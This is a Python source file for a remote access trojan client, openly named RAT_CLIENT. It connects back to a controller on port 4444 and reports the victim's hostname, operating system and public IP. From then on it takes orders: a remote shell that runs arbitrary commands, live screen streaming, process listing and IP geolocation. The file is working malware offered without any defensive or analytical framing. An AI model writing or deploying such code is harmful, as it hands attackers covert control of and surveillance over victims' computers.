import socket
import os
import platform
import json
import urllib.request
import subprocess

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def get_public_ip(self):
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json") as url:
                data = json.loads(url.read().decode())
                return data['ip']
        except:
            return "N/A"

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        
        client_info = {
            "name": socket.gethostname(),
            "os": platform.platform(),
            "ip": self.get_public_ip()
        }
        s.send(json.dumps(client_info).encode())

    def execute(self):
        while True:
            command = s.recv(1024).decode()
            
            if command == 'shell':
                while True:
                    command = s.recv(1024).decode()
                    if command.lower() == 'exit':
                        break
                    if command.startswith('cd'):
                        try:
                            os.chdir(command[3:])
                            dir = os.getcwd()
                            s.send(dir.encode())
                        except FileNotFoundError:
                            s.send("Directory not found".encode())
                    else:
                        output = subprocess.getoutput(command)
                        s.send(output.encode())

            elif command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except ImportError:
                    s.send("Impossible to get screen".encode())
                except Exception as e:
                    s.send(f"Error in screenshare: {str(e)}".encode())

            elif command == 'tasklist':
                output = subprocess.getoutput('tasklist')
                s.send(output.encode())
            
            elif command == 'geolocate':
                try:
                    with urllib.request.urlopen("https://ipinfo.io/json") as url:
                        data = json.loads(url.read().decode())
                        location = f"IP: {data['ip']}, Location: {data['city']}, {data['region']}, {data['country']}, {data['org']}"
                        s.send(location.encode())
                except Exception as e:
                    s.send(f"Error in geolocate: {str(e)}".encode())

    def close(self):
        s.close()

if __name__ == "__main__":
    rat_client = RAT_CLIENT('127.0.0.1', 4444)
    rat_client.build_connection()
    rat_client.execute()
